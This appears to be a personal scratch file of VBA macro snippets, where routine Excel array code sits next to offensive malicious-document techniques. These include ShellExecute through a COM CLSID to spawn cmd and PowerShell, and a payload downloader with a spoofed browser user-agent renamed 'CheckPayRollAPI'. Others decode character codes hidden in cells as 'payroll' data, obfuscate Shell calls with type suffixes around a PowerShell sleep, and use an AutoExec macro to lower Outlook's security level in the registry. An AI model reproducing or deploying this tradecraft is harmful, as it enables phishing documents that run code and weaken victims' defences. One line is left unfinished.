Sub test()
Dim sampleArr() As Variant
Dim myArray() As Double, X As Long
Dim i As Integer
Dim rng As Range, cel As Range
Dim R As Byte
X = 0
i = 1
ReDim Preserve myArray(X)

Set rng = Range("A1:E10") ' Note, this creates a 2 Dimensional array

sampleArr = rng ' Right here, this sets the values in the range to this array.

For i = LBound(sampleArr) To UBound(sampleArr)
    ReDim Preserve myArray(0 To X)
    myArray(X) = sampleArr(i, 1)
    X = X + 1
Next i

For Each thing In myArray()
    Debug.Print thing
Next
End Sub


#######dl func
Function GetXMLHTTPResult(Url As String)
    Dim XMLHTTP As Object, attempts As Integer
    attempts = 3
    On Error GoTo TryAgain
TryAgain:
    attempts = attempts - 1
    Err.Clear
    If attempts > 0 Then
        Set XMLHTTP = CreateObject("MSXML2.serverXMLHTTP")
        XMLHTTP.Open "GET", Url, False
        XMLHTTP.setRequestHeader "Content-Type", "text/xml"
        XMLHTTP.setRequestHeader "Cache-Control", "no-cache"
        XMLHTTP.setRequestHeader "Pragma", "no-cache"
        XMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/25.0"
        XMLHTTP.send
        GetXMLHTTPResult = XMLHTTP.ResponseText
    End If
End Function
Sub SaveFile()
        Dim Url As String
        Dim Outty As String
        Outty = Environ("TEMP")
        Url = "<>"
        res = GetXMLHTTPResult(Url)
        Debug.Print res
        Open "D:\powershell\modules\out.txt" For Output As #1
        Write #1, res
        Close #1
End Sub

####### Exec program

Sub t()
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    obj.Document.Application.ShellExecute "calc", Null, "C:\Windows\System32", Null, 0
End Sub

##### Read multi-dimensional array horizontally

Sub test()
Dim sampleArr() As Variant

sampleArr = Application.Transpose([a1:e10])
For Each thing In sampleArr()
    Debug.Print thing
Next
End Sub

#### Read multi-dimensional array vertically

Sub test()
Dim sampleArr() As Variant
Dim rng As Range
Set rng = Range("A1:E10") 
sampleArr = rng.Value

For Each thing In sampleArr()
    Debug.Print thing
Next
End Sub

######## Excel Convert range/multi-dimensional array (horizontally) to string #####

Sub test()
Dim payroll() As Variant
Dim b() As Variant
Dim x As Integer
x = 0
payroll = Application.Transpose([a1:e10])
For Each Thing In payroll()
    ReDim Preserve b(0 To x)
    b(x) = ChrW(Thing)
    x = x + 1
Next
Debug.Print Join(b, "")
End Sub


####### Call powershell with ShellExecute

Sub t()
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    Set obj2 = obj.Document.Application
    CallByName obj2, "ShellExecute", VbMethod, "cmd", "/c powershell.exe -NoExit"
End Sub


#### dictates what the function returns
$ : String
% : Integer (Int16)
& : Long (Int32)
! : Single
# : Double

############ WORKING STUFF

Function CalcPayroll()
    Dim payroll() As Variant
    Dim b() As Variant
    Dim x As Integer
    x = 0
    payroll = Application.Transpose([a1:e10])
    For Each Thing In payroll()
        ReDim Preserve b(0 To x)
        b(x) = ChrW(Thing)
        x = x + 1
    Next
    CalcPayroll = Join(b, "")
End Function

Function CheckPayRollAPI(Url As String)
    Dim APICall As Object, attempts As Integer
    attempts = 3
    On Error GoTo TryAgain
TryAgain:
    attempts = attempts - 1
    Err.Clear
    If attempts > 0 Then
        Set API = CreateObject("MSXML2.serverXMLHTTP")
        API.Open "GET", Url, False
        API.setRequestHeader "Content-Type", "text/xml"
        API.setRequestHeader "Cache-Control", "no-cache"
        API.setRequestHeader "Pragma", "no-cache"
        API.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/25.0"
        API.send
        CheckPayRollAPI = API.ResponseText
    End If
End Function


Function SaveFile()
        Dim Url As String
        Dim Outty As String
        Outty = Environ("TEMP")
        Url = "<>"
        res = CheckPayRollAPI(Url)
        Debug.Print res
        Open "D:\powershell\modules\out.txt" For Output As #1
        Write #1, res
        Close #1
End Function


Sub t()
    Dim S As String
    Dim P As String
    P = SaveFile()
    S = CalcPayroll()
    Debug.Print S
    Debug.Print P
    Debug.Print Environ("USERDOMAIN")
End Sub


Sub b()
    Dim Core As String
    Core = Environ("
    Call Interaction%.Shell!("cmd /c powershell -command sleep 300; $([double]'2')", vbNormalFocus)
    
End Sub
@ : Decimal

############# Win10 HKCU registry manipulate office sec settings
Const HKEY_CURRENT_USER = &H80000001
Function TestME()
    Dim temp As Object
    Dim rPath As String
    Dim rVal, strKeyPath, rKey
    
    Set temp = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    rPath = "Software\Microsoft\Office\16.0\Outlook\Security"
    rKey = "Level"
    rVal = 2
    temp.GetDWORDValue HKEY_CURRENT_USER, rPath, rKey, dwValue
    Debug.Print "test: " & dwValue
    temp.SetDWORDValue HKEY_CURRENT_USER, rPath, rKey, rVal
    TestME = dwValue
End Function

Sub AutoExec()
Debug.Print "Out msg: " & TestME

End Sub
